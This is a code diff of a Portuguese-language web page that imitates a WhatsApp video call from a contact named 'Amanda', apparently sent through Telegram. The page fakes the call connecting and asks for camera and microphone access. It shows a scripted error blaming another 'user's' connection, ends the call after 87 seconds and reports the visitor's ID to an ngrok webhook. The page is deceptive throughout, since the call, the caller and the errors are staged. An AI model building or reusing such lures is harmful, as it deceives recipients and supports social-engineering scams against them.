@@ -5,75 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WhatsApp Video Call</title>
     
-    <script>
-        // Detectar se está no Telegram
-        const isTelegram = /TelegramBot|Telegram/i.test(navigator.userAgent) || window.TelegramWebviewProxy;
-        
-        // Validação IMEDIATA - mas com micro delay para URL processar
-        setTimeout(function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const timestamp = urlParams.get('t');
-            const userId = urlParams.get('u');
-
-            function showErrorScreen() {
-                document.body.innerHTML = `
-                    <div style="
-                        display: flex; 
-                        align-items: center; 
-                        justify-content: center; 
-                        height: 100vh; 
-                        background: #000;
-                        margin: 0;
-                        padding: 20px;
-                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-                    ">
-                        <div style="
-                            text-align: center;
-                            max-width: 400px;
-                        ">
-                            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" style="margin: 0 auto 24px auto; opacity: 0.7;">
-                                <circle cx="12" cy="12" r="10" stroke="#666" stroke-width="1.5"/>
-                                <path d="M15 9l-6 6" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
-                                <path d="M9 9l6 6" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
-                            </svg>
-                            <h1 style="
-                                color: #fff;
-                                font-size: 22px;
-                                font-weight: 400;
-                                margin: 0 0 16px 0;
-                                letter-spacing: -0.01em;
-                            ">Chamada não encontrada</h1>
-                            <p style="
-                                color: #999;
-                                font-size: 16px;
-                                margin: 0;
-                                line-height: 1.5;
-                            ">Esta videochamada foi encerrada devido a instabilidade na conexão de internet da usuária Mary.</p>
-                        </div>
-                    </div>
-                `;
-                document.body.style.margin = '0';
-                document.body.style.padding = '0';
-            }
-
-            // Verificações de validação
-            if (!timestamp || !userId) {
-                showErrorScreen();
-                return;
-            }
-
-            const now = Math.floor(Date.now() / 1000);
-            const linkAge = now - parseInt(timestamp);
-
-            if (linkAge > 1800) {
-                showErrorScreen();
-                return;
-            }
-
-            console.log('✅ Link válido! Iniciando videochamada...');
-        }, 50);
-    </script>
-    
     <style>
         * {
             margin: 0;
@@ -91,31 +22,8 @@
             width: 100vw;
         }
 
-        /* 🔥 OTIMIZAÇÕES PARA TELEGRAM */
+        /* Background */
         .video-background {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-
-        .background-video {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            object-fit: cover;
-            filter: brightness(0.4) blur(1px);
-        }
-
-        /* 🔥 FALLBACK PARA TELEGRAM - FUNDO ESTÁTICO */
-        .static-background {
             position: absolute;
             top: 0;
             left: 0;
@@ -124,7 +32,6 @@
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
             background-size: 400% 400%;
             animation: gradientShift 8s ease infinite;
-            display: none;
         }
 
         @keyframes gradientShift {
@@ -174,16 +81,8 @@
             color: white;
             font-weight: bold;
             font-size: 16px;
-            overflow: hidden;
             border: 3px solid #25D366;
             box-shadow: 0 0 0 2px rgba(37, 211, 102, 0.3);
-        }
-
-        .contact-avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 50%;
         }
 
         .contact-details h3 {
@@ -204,37 +103,14 @@
             50% { opacity: 1; }
         }
 
-        .header-actions {
-            display: flex;
-            gap: 20px;
-        }
-
-        .header-btn {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.2);
-            border: none;
-            color: white;
-            font-size: 18px;
-            cursor: pointer;
-            transition: all 0.2s;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        .header-btn:active {
-            background: rgba(255,255,255,0.3);
-            transform: scale(0.95);
-        }
-
-        /* Self Video Preview - CÂMERA REAL */
+        /* Self Video Preview */
         .self-video {
             position: absolute;
             top: 120px;
             right: 20px;
             width: 120px;
             height: 180px;
-            background: #000;
+            background: #333;
             border-radius: 12px;
             overflow: hidden;
             z-index: 5;
@@ -246,7 +122,8 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scaleX(-1); /* Efeito espelho */
+            transform: scaleX(-1);
+            display: none;
         }
 
         .camera-placeholder {
@@ -260,7 +137,6 @@
             color: #666;
             font-size: 24px;
             text-align: center;
-            padding: 10px;
         }
 
         .camera-placeholder .icon {
@@ -273,7 +149,7 @@
             opacity: 0.7;
         }
 
-        /* CRONÔMETRO */
+        /* Cronômetro */
         .timer-container {
             position: absolute;
             top: 310px;
@@ -290,7 +166,6 @@
             background: rgba(0,0,0,0.8);
             padding: 8px 12px;
             border-radius: 12px;
-            backdrop-filter: blur(10px);
             display: inline-block;
             border: 1px solid rgba(255,255,255,0.2);
         }
@@ -321,28 +196,12 @@
             justify-content: center;
             font-size: 24px;
             transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-            -webkit-tap-highlight-color: transparent;
             outline: none;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        .control-btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            background: rgba(255,255,255,0.3);
-            border-radius: 50%;
-            transition: all 0.3s;
-            transform: translate(-50%, -50%);
-        }
-
-        .control-btn:active::before {
-            width: 120%;
-            height: 120%;
+        .control-btn:active {
+            transform: scale(0.9);
         }
 
         .btn-end {
@@ -351,20 +210,15 @@
             box-shadow: 0 4px 20px rgba(255, 71, 87, 0.4);
         }
 
-        .btn-end:active {
-            background: #ff3742;
-            transform: scale(0.90);
-        }
-
         .btn-mute {
             background: rgba(255,255,255,0.2);
             color: white;
             border: 2px solid rgba(255,255,255,0.3);
         }
 
-        .btn-mute:active {
-            background: rgba(255,255,255,0.3);
-            transform: scale(0.90);
+        .btn-mute.muted {
+            background: #ff4757;
+            border-color: #ff4757;
         }
 
         .btn-camera {
@@ -373,43 +227,20 @@
             border: 2px solid rgba(255,255,255,0.3);
         }
 
-        .btn-camera:active {
-            background: rgba(255,255,255,0.3);
-            transform: scale(0.90);
-        }
-
-        /* Estados dos botões */
-        .muted .btn-mute {
+        .btn-camera.off {
             background: #ff4757;
             border-color: #ff4757;
         }
 
-        .camera-off .btn-camera {
-            background: #ff4757;
-            border-color: #ff4757;
-        }
-
-        .camera-off .user-video {
-            display: none;
-        }
-
-        .camera-off .camera-placeholder {
-            display: flex;
-        }
-
-        .camera-on .camera-placeholder {
-            display: none;
-        }
-
-        /* Permission overlay */
-        .permission-overlay {
+        /* Permission Dialog */
+        .permission-dialog {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.9);
-            display: flex;
+            display: none;
             flex-direction: column;
             align-items: center;
             justify-content: center;
@@ -419,7 +250,7 @@
             padding: 20px;
         }
 
-        .permission-overlay button {
+        .permission-dialog button {
             padding: 12px 24px;
             margin: 10px;
             border: none;
@@ -429,100 +260,54 @@
             transition: all 0.3s;
         }
 
-        .permission-overlay .btn-primary {
+        .btn-primary {
             background: #25D366;
             color: white;
         }
 
-        .permission-overlay .btn-secondary {
+        .btn-secondary {
             background: transparent;
             color: #ccc;
             border: 1px solid #666;
         }
 
-        /* Network indicator */
-        .network-indicator {
-            position: absolute;
-            top: 60px;
-            right: 20px;
+        /* Status indicators */
+        .camera-on .user-video {
+            display: block;
+        }
+
+        .camera-on .camera-placeholder {
+            display: none;
+        }
+
+        .camera-off .user-video {
+            display: none;
+        }
+
+        .camera-off .camera-placeholder {
             display: flex;
-            gap: 2px;
-            z-index: 15;
-        }
-
-        .signal-bar {
-            width: 3px;
-            height: 12px;
-            background: rgba(255,255,255,0.3);
-            border-radius: 1px;
-        }
-
-        .signal-bar.active {
-            background: #25D366;
-            animation: signalPulse 2s infinite;
-        }
-
-        @keyframes signalPulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-
-        /* 🔥 TELEGRAM SPECIFIC OPTIMIZATIONS */
-        @media screen and (max-width: 768px) {
-            .background-video {
-                filter: brightness(0.3) blur(2px);
-            }
-            
-            .controls {
-                gap: 30px;
-            }
-            
-            .control-btn {
-                width: 55px;
-                height: 55px;
-                font-size: 22px;
-            }
         }
     </style>
 </head>
 <body>
-    <!-- Background Video -->
+    <!-- Background -->
     <div class="video-background">
-        <video class="background-video" id="backgroundVideo" autoplay loop playsinline muted preload="metadata">
-            <source src="video.mp4" type="video/mp4">
-        </video>
         <div class="video-overlay"></div>
-    </div>
-    
-    <!-- Fallback estático para Telegram -->
-    <div class="static-background" id="staticBackground"></div>
-    
-    <!-- Network Indicator -->
-    <div class="network-indicator">
-        <div class="signal-bar active"></div>
-        <div class="signal-bar active"></div>
-        <div class="signal-bar active"></div>
-        <div class="signal-bar"></div>
     </div>
 
     <!-- Header -->
     <div class="header">
         <div class="contact-info">
-            <div class="contact-avatar">
-                <img src="amanda.jpg" alt="Amanda" onerror="this.style.display='none'; this.parentElement.textContent='AM';">
-            </div>
+            <div class="contact-avatar">AM</div>
             <div class="contact-details">
                 <h3>Amanda</h3>
                 <div class="call-status" id="callStatus">Chamando...</div>
             </div>
         </div>
-        <div class="header-actions">
-            <button class="header-btn" onclick="toggleFullscreen()">⛶</button>
-        </div>
     </div>
 
-    <!-- Self Video Preview - CÂMERA REAL -->
-    <div class="self-video">
+    <!-- Self Video Preview -->
+    <div class="self-video camera-off">
         <video class="user-video" id="userVideo" autoplay playsinline muted></video>
         <div class="camera-placeholder">
             <div class="icon">📷</div>
@@ -537,191 +322,131 @@
 
     <!-- Bottom Controls -->
     <div class="controls">
-        <button class="control-btn btn-mute" id="muteBtn">
+        <button class="control-btn btn-mute" id="muteBtn" onclick="toggleMute()">
             🎤
         </button>
-        <button class="control-btn btn-end" id="endBtn">
+        <button class="control-btn btn-end" id="endBtn" onclick="endCall()">
             📞
         </button>
-        <button class="control-btn btn-camera" id="cameraBtn">
+        <button class="control-btn btn-camera" id="cameraBtn" onclick="toggleCamera()">
             📹
         </button>
     </div>
 
-    <script>
-        // 🔥 DETECTAR TELEGRAM
-        const isTelegram = /TelegramBot|Telegram/i.test(navigator.userAgent) || window.TelegramWebviewProxy;
-        console.log('🤖 Telegram detectado:', isTelegram);
+    <!-- Permission Dialog -->
+    <div class="permission-dialog" id="permissionDialog">
+        <div style="font-size: 64px; margin-bottom: 20px;">📹</div>
+        <h2 style="margin-bottom: 15px;">Permitir Acesso à Câmera</h2>
+        <p style="margin-bottom: 30px; opacity: 0.8; line-height: 1.4; max-width: 300px;">
+            Para participar da videochamada, precisamos acessar sua câmera e microfone.
+        </p>
+        <button class="btn-primary" onclick="requestCamera()">Permitir Acesso</button>
+        <button class="btn-secondary" onclick="closePermissionDialog()">Agora Não</button>
+    </div>
 
-        // 🔥 VARIÁVEIS GLOBAIS
+    <script>
+        // 🔥 VARIÁVEIS SIMPLES
         let isMuted = false;
-        let cameraOff = true; // Começar com câmera DESLIGADA
+        let cameraOn = false;
         let callStarted = false;
         let callTimer = 0;
         let timerInterval;
         let userStream = null;
-        let audioContext = null;
 
-        // 🔥 ELEMENTOS DOM
+        // 🔥 ELEMENTOS
         const userVideo = document.getElementById('userVideo');
         const muteBtn = document.getElementById('muteBtn');
         const cameraBtn = document.getElementById('cameraBtn');
         const endBtn = document.getElementById('endBtn');
         const callStatus = document.getElementById('callStatus');
+        const permissionDialog = document.getElementById('permissionDialog');
+        const selfVideoContainer = document.querySelector('.self-video');
 
-        // 🔥 FUNÇÃO PARA ATIVAR FALLBACK ESTÁTICO
-        function activateStaticBackground() {
-            console.log('🔄 Ativando fundo estático (fallback)');
-            document.querySelector('.video-background').style.display = 'none';
-            document.getElementById('staticBackground').style.display = 'block';
-        }
+        // 🔥 LOG INICIAL
+        console.log('🚀 Videochamada iniciando...');
+        console.log('📱 User Agent:', navigator.userAgent);
+        console.log('🎥 MediaDevices:', !!navigator.mediaDevices);
 
-        // 🔥 INICIALIZAÇÃO DO VÍDEO DE FUNDO
-        function initVideoBackground() {
-            const video = document.getElementById('backgroundVideo');
+        // 🔥 FUNÇÃO: SOLICITAR CÂMERA
+        async function requestCamera() {
+            console.log('📹 Solicitando acesso à câmera...');
             
-            if (isTelegram) {
-                console.log('🤖 Modo Telegram: configurações otimizadas');
-                video.addEventListener('error', activateStaticBackground);
-                video.addEventListener('stalled', () => {
-                    setTimeout(() => {
-                        if (video.readyState < 3) activateStaticBackground();
-                    }, 2000);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: true
                 });
                 
-                video.muted = true;
-                video.volume = 0;
+                console.log('✅ Câmera liberada!');
+                userStream = stream;
+                userVideo.srcObject = stream;
                 
-                setTimeout(() => {
-                    if (video.readyState < 2) activateStaticBackground();
-                }, 3000);
-                
-            } else {
-                console.log('🌐 Navegador normal: configurações padrão');
-                video.play().then(() => {
-                    setTimeout(() => {
-                        video.muted = false;
-                        video.volume = 0.8;
-                    }, 3000);
-                }).catch(activateStaticBackground);
-            }
-        }
-
-        // 🔥 ATIVAR CÂMERA FRONTAL
-        async function startCamera() {
-            try {
-                console.log('📹 Tentando ativar câmera...');
-                
-                const constraints = {
-                    video: { 
-                        facingMode: 'user', // Câmera frontal
-                        width: { ideal: isTelegram ? 480 : 720 },
-                        height: { ideal: isTelegram ? 640 : 1280 }
-                    }, 
-                    audio: true 
-                };
-                
-                userStream = await navigator.mediaDevices.getUserMedia(constraints);
-                userVideo.srcObject = userStream;
-                
-                // Ativar visual da câmera
-                cameraOff = false;
-                document.body.classList.remove('camera-off');
-                document.body.classList.add('camera-on');
-                cameraBtn.textContent = '📹';
-                
-                console.log('✅ Câmera ativada com sucesso!');
+                // Ativar visualmente
+                cameraOn = true;
                 updateCameraUI();
+                closePermissionDialog();
                 
             } catch (error) {
-                console.error('❌ Erro ao acessar câmera:', error);
-                showPermissionDialog();
+                console.error('❌ Erro na câmera:', error);
+                alert('Não foi possível acessar a câmera. Verifique as permissões.');
+                closePermissionDialog();
             }
         }
 
-        // 🔥 DIALOG DE PERMISSÃO DA CÂMERA
+        // 🔥 FUNÇÃO: FECHAR DIALOG
+        function closePermissionDialog() {
+            permissionDialog.style.display = 'none';
+        }
+
+        // 🔥 FUNÇÃO: MOSTRAR DIALOG
         function showPermissionDialog() {
-            const overlay = document.createElement('div');
-            overlay.className = 'permission-overlay';
-            overlay.innerHTML = `
-                <div style="font-size: 64px; margin-bottom: 20px;">📹</div>
-                <h2 style="margin-bottom: 15px;">Permitir Acesso à Câmera</h2>
-                <p style="margin-bottom: 30px; opacity: 0.8; line-height: 1.4; max-width: 300px;">
-                    Para participar da videochamada, precisamos acessar sua câmera e microfone.
-                    ${isTelegram ? '<br><br><strong>No Telegram:</strong> Toque em "Permitir" quando solicitado.' : ''}
-                </p>
-                <button class="btn-primary" onclick="requestPermissionAgain()">Permitir Acesso</button>
-                <button class="btn-secondary" onclick="continueWithoutCamera()">Continuar Sem Câmera</button>
-            `;
-            
-            document.body.appendChild(overlay);
-            window.permissionOverlay = overlay;
+            permissionDialog.style.display = 'flex';
         }
 
-        // 🔥 FUNÇÕES GLOBAIS PARA OS BOTÕES DO DIALOG
-        window.requestPermissionAgain = function() {
-            if (window.permissionOverlay) {
-                window.permissionOverlay.remove();
-                window.permissionOverlay = null;
-            }
-            startCamera();
-        };
-
-        window.continueWithoutCamera = function() {
-            if (window.permissionOverlay) {
-                window.permissionOverlay.remove();
-                window.permissionOverlay = null;
-            }
-            console.log('Usuário optou por continuar sem câmera');
-        };
-
-        // 🔥 TOGGLE CAMERA (BOTÃO FUNCIONAL)
+        // 🔥 FUNÇÃO: TOGGLE CÂMERA
         function toggleCamera() {
-            console.log('🔄 Toggle camera - Estado atual:', cameraOff);
+            console.log('🔄 Toggle câmera - Estado:', cameraOn);
             
-            if (cameraOff) {
-                // Ativar câmera
-                if (userStream) {
-                    // Já tem stream, apenas ativar
-                    userStream.getVideoTracks().forEach(track => track.enabled = true);
-                    cameraOff = false;
-                    updateCameraUI();
-                } else {
-                    // Iniciar câmera pela primeira vez
-                    startCamera();
-                }
-            } else {
-                // Desativar câmera
-                if (userStream) {
-                    userStream.getVideoTracks().forEach(track => track.enabled = false);
-                }
-                cameraOff = true;
-                updateCameraUI();
+            if (!userStream) {
+                // Primeira vez - solicitar permissão
+                showPermissionDialog();
+                return;
             }
             
-            createRipple(cameraBtn);
+            // Já tem stream - toggle
+            cameraOn = !cameraOn;
+            
+            if (userStream) {
+                userStream.getVideoTracks().forEach(track => {
+                    track.enabled = cameraOn;
+                });
+            }
+            
+            updateCameraUI();
         }
 
-        // 🔥 ATUALIZAR UI DA CÂMERA
+        // 🔥 FUNÇÃO: ATUALIZAR UI CÂMERA
         function updateCameraUI() {
-            if (cameraOff) {
-                document.body.classList.add('camera-off');
-                document.body.classList.remove('camera-on');
-                cameraBtn.textContent = '📷';
-                cameraBtn.style.background = '#ff4757';
-                console.log('📷 Câmera DESLIGADA');
-            } else {
-                document.body.classList.remove('camera-off');
-                document.body.classList.add('camera-on');
+            if (cameraOn) {
+                selfVideoContainer.className = 'self-video camera-on';
+                cameraBtn.className = 'control-btn btn-camera';
                 cameraBtn.textContent = '📹';
-                cameraBtn.style.background = 'rgba(255,255,255,0.2)';
                 console.log('📹 Câmera LIGADA');
+            } else {
+                selfVideoContainer.className = 'self-video camera-off';
+                cameraBtn.className = 'control-btn btn-camera off';
+                cameraBtn.textContent = '📷';
+                console.log('📷 Câmera DESLIGADA');
             }
         }
 
-        // 🔥 TOGGLE MUTE (BOTÃO FUNCIONAL)
+        // 🔥 FUNÇÃO: TOGGLE MUTE
         function toggleMute() {
-            console.log('🔄 Toggle mute - Estado atual:', isMuted);
+            console.log('🔄 Toggle mute - Estado:', isMuted);
             
             isMuted = !isMuted;
             
@@ -732,32 +457,30 @@
             }
             
             updateMuteUI();
-            createRipple(muteBtn);
         }
 
-        // 🔥 ATUALIZAR UI DO MUTE
+        // 🔥 FUNÇÃO: ATUALIZAR UI MUTE
         function updateMuteUI() {
             if (isMuted) {
-                document.body.classList.add('muted');
+                muteBtn.className = 'control-btn btn-mute muted';
                 muteBtn.textContent = '🔇';
-                muteBtn.style.background = '#ff4757';
                 console.log('🔇 Microfone MUTADO');
             } else {
-                document.body.classList.remove('muted');
+                muteBtn.className = 'control-btn btn-mute';
                 muteBtn.textContent = '🎤';
-                muteBtn.style.background = 'rgba(255,255,255,0.2)';
                 console.log('🎤 Microfone ATIVO');
             }
         }
 
-        // 🔥 INICIAR CHAMADA
+        // 🔥 FUNÇÃO: INICIAR CHAMADA
         function startCall() {
             if (callStarted) return;
             
+            console.log('📞 Iniciando chamada...');
             callStarted = true;
             callStatus.textContent = 'Conectado';
             
-            // Timer da chamada
+            // Timer
             timerInterval = setInterval(() => {
                 callTimer++;
                 const minutes = Math.floor(callTimer / 60);
@@ -766,84 +489,83 @@
                     `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
             }, 1000);
             
-            // Solicitar permissão da câmera após conectar
+            // Solicitar câmera após 3 segundos
             setTimeout(() => {
-                showPermissionDialog();
-            }, 2000);
+                if (!userStream) {
+                    showPermissionDialog();
+                }
+            }, 3000);
             
-            // Auto-encerrar após 1 minuto e 27 segundos
+            // Auto-encerrar após 87 segundos
             setTimeout(() => {
                 endCall();
             }, 87000);
         }
 
-        // 🔥 ENCERRAR CHAMADA
+        // 🔥 FUNÇÃO: ENCERRAR CHAMADA
         function endCall() {
-            console.log("🔴 Encerrando chamada...");
+            console.log('🔴 Encerrando chamada...');
             
             // Parar timer
             if (timerInterval) {
                 clearInterval(timerInterval);
             }
             
-            // Parar câmera e microfone
+            // Parar streams
             if (userStream) {
                 userStream.getTracks().forEach(track => {
                     track.stop();
                     console.log('🛑 Track parado:', track.kind);
                 });
-                userStream = null;
-            }
-            
-            // Parar vídeo de fundo
-            const video = document.querySelector('.background-video');
-            if (video) {
-                video.pause();
             }
             
             // Enviar webhook
-            sendCallEndedWebhook();
+            sendWebhook();
             
-            // Mostrar tela de fim
+            // Tela de fim
             setTimeout(showEndScreen, 500);
         }
 
-        // 🔥 ENVIAR WEBHOOK
-        function sendCallEndedWebhook() {
+        // 🔥 FUNÇÃO: ENVIAR WEBHOOK
+        function sendWebhook() {
             const urlParams = new URLSearchParams(window.location.search);
             const userId = urlParams.get('u');
             const duration = document.getElementById('callTimer').textContent;
             
-            if (!userId) return;
-            
-            let webhookUrl;
-            if (isTelegram || /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-                webhookUrl = 'https://056a-45-174-80-203.ngrok-free.app/api/call-ended';
-                console.log("📱 MOBILE/TELEGRAM - usando ngrok");
-            } else {
-                webhookUrl = 'http://localhost:5000/api/call-ended';
-                console.log("💻 DESKTOP - usando localhost");
+            if (!userId) {
+                console.log('❌ Sem userId para webhook');
+                return;
             }
             
-            const webhookData = {
-                userId: userId,
-                duration: duration || "01:27"
-            };
+            // Detectar se é mobile/telegram
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const webhookUrl = isMobile ? 
+                'https://056a-45-174-80-203.ngrok-free.app/api/call-ended' : 
+                'http://localhost:5000/api/call-ended';
+            
+            console.log('📡 Enviando webhook:', webhookUrl);
             
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(webhookData)
+                body: JSON.stringify({
+                    userId: userId,
+                    duration: duration || "01:27"
+                })
             })
             .then(response => {
-                console.log("✅ Webhook enviado:", response.status);
+                console.log('✅ Webhook enviado:', response.status);
                 return response.json();
             })
-            .then(data => console.log("📝 Resposta:", data))
-            .catch(error => console.error("❌ Erro webhook:", error));
+            .then(data => {
+                console.log('📝 Resposta webhook:', data);
+            })
+            .catch(error => {
+                console.error('❌ Erro webhook:', error);
+            });
         }
 
-        // 🔥 TELA DE FIM
+        // 🔥 FUNÇÃO: TELA DE FIM
         function showEndScreen() {
             document.body.innerHTML = `
                 <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; text-align: center; background: #000;">
@@ -855,168 +577,78 @@
             `;
         }
 
-        // 🔥 FULLSCREEN
-        function toggleFullscreen() {
-            if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen();
-            } else {
-                document.exitFullscreen();
+        // 🔥 VALIDAÇÃO DA URL
+        function validateUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const timestamp = urlParams.get('t');
+            const userId = urlParams.get('u');
+
+            if (!timestamp || !userId) {
+                showErrorScreen();
+                return false;
             }
+
+            const now = Math.floor(Date.now() / 1000);
+            const linkAge = now - parseInt(timestamp);
+
+            if (linkAge > 1800) { // 30 minutos
+                showErrorScreen();
+                return false;
+            }
+
+            return true;
         }
 
-        // 🔥 EFEITO RIPPLE
-        function createRipple(button) {
-            const ripple = document.createElement('span');
-            const rect = button.getBoundingClientRect();
-            const size = Math.max(rect.width, rect.height);
-            
-            ripple.style.cssText = `
-                position: absolute;
-                border-radius: 50%;
-                background: rgba(255,255,255,0.6);
-                transform: scale(0);
-                animation: ripple 0.6s linear;
-                pointer-events: none;
-                width: ${size}px;
-                height: ${size}px;
-                left: 50%;
-                top: 50%;
-                transform: translate(-50%, -50%) scale(0);
+        // 🔥 TELA DE ERRO
+        function showErrorScreen() {
+            document.body.innerHTML = `
+                <div style="display: flex; align-items: center; justify-content: center; height: 100vh; background: #000; color: white; text-align: center; padding: 20px;">
+                    <div>
+                        <div style="font-size: 64px; margin-bottom: 20px;">❌</div>
+                        <h1 style="font-size: 22px; margin-bottom: 16px;">Chamada não encontrada</h1>
+                        <p style="color: #999; font-size: 16px;">Esta videochamada foi encerrada devido a instabilidade na conexão de internet da usuária Mary.</p>
+                    </div>
+                </div>
             `;
-            
-            button.appendChild(ripple);
-            
-            setTimeout(() => {
-                ripple.style.transform = 'translate(-50%, -50%) scale(4)';
-                ripple.style.opacity = '0';
-            }, 10);
-            
-            setTimeout(() => {
-                ripple.remove();
-            }, 600);
         }
-
-        // 🔥 EVENT LISTENERS DOS BOTÕES
-        muteBtn.addEventListener('click', toggleMute);
-        muteBtn.addEventListener('touchstart', function(e) {
-            e.preventDefault();
-            this.style.transform = 'scale(0.9)';
-        });
-        muteBtn.addEventListener('touchend', function(e) {
-            e.preventDefault();
-            this.style.transform = 'scale(1)';
-        });
-
-        cameraBtn.addEventListener('click', toggleCamera);
-        cameraBtn.addEventListener('touchstart', function(e) {
-            e.preventDefault();
-            this.style.transform = 'scale(0.9)';
-        });
-        cameraBtn.addEventListener('touchend', function(e) {
-            e.preventDefault();
-            this.style.transform = 'scale(1)';
-        });
-
-        endBtn.addEventListener('click', endCall);
-        endBtn.addEventListener('touchstart', function(e) {
-            e.preventDefault();
-            this.style.transform = 'scale(0.9)';
-        });
-        endBtn.addEventListener('touchend', function(e) {
-            e.preventDefault();
-            this.style.transform = 'scale(1)';
-        });
 
         // 🔥 INICIALIZAÇÃO
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('🚀 Iniciando videochamada...');
+            console.log('📱 DOM carregado');
             
-            // Inicializar vídeo de fundo
-            initVideoBackground();
+            // Validar URL
+            if (!validateUrl()) {
+                return;
+            }
             
-            // Definir estado inicial
+            // Inicializar UI
             updateCameraUI();
             updateMuteUI();
             
-            console.log('✅ Interface carregada');
+            console.log('✅ Sistema pronto');
         });
 
         // 🔥 AUTO-INICIAR CHAMADA
-        setTimeout(startCall, 3000);
+        setTimeout(() => {
+            startCall();
+        }, 3000);
 
-        // 🔥 OTIMIZAÇÕES PARA TELEGRAM
-        if (isTelegram) {
-            document.addEventListener('DOMContentLoaded', function() {
-                const style = document.createElement('style');
-                style.textContent = `
-                    * {
-                        animation-duration: 0.1s !important;
-                        transition-duration: 0.1s !important;
-                    }
-                `;
-                document.head.appendChild(style);
-            });
-        }
-
-        // 🔥 PREVENÇÃO DE ZOOM E CONTEXT MENU
+        // 🔥 PREVENÇÕES
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('selectstart', e => e.preventDefault());
-        document.addEventListener('dragstart', e => e.preventDefault());
-        
-        let lastTouchEnd = 0;
-        document.addEventListener('touchend', function (event) {
-            const now = (new Date()).getTime();
-            if (now - lastTouchEnd <= 300) {
-                event.preventDefault();
-            }
-            lastTouchEnd = now;
-        }, false);
 
-        // 🔥 SIMULAR MUDANÇAS DE REDE
-        setInterval(() => {
-            const bars = document.querySelectorAll('.signal-bar');
-            const activeCount = Math.floor(Math.random() * 4) + 1;
-            
-            bars.forEach((bar, index) => {
-                if (index < activeCount) {
-                    bar.classList.add('active');
-                } else {
-                    bar.classList.remove('active');
-                }
+        // 🔥 FEEDBACK DE TOQUE
+        document.querySelectorAll('.control-btn').forEach(btn => {
+            btn.addEventListener('touchstart', function() {
+                this.style.transform = 'scale(0.9)';
             });
-        }, isTelegram ? 10000 : 5000);
-
-        // 🔥 LIMPEZA DE MEMÓRIA
-        window.addEventListener('beforeunload', function() {
-            if (userStream) {
-                userStream.getTracks().forEach(track => track.stop());
-            }
-            const video = document.querySelector('.background-video');
-            if (video) {
-                video.pause();
-                video.src = '';
-                video.load();
-            }
+            
+            btn.addEventListener('touchend', function() {
+                this.style.transform = 'scale(1)';
+            });
         });
 
-        // 🔥 ADICIONAR ESTILOS PARA ANIMAÇÃO DO RIPPLE
-        const rippleStyle = document.createElement('style');
-        rippleStyle.textContent = `
-            @keyframes ripple {
-                to {
-                    transform: translate(-50%, -50%) scale(4);
-                    opacity: 0;
-                }
-            }
-        `;
-        document.head.appendChild(rippleStyle);
-
-        // 🔥 DEBUG LOGS
-        console.log('🔧 Sistema inicializado');
-        console.log('📱 Telegram:', isTelegram);
-        console.log('🌐 User Agent:', navigator.userAgent);
-        console.log('📹 Suporte MediaDevices:', !!navigator.mediaDevices);
-        console.log('🎤 Suporte getUserMedia:', !!navigator.mediaDevices?.getUserMedia);
+        console.log('🎬 Script carregado completamente');
     </script>
 </body>
 </html>
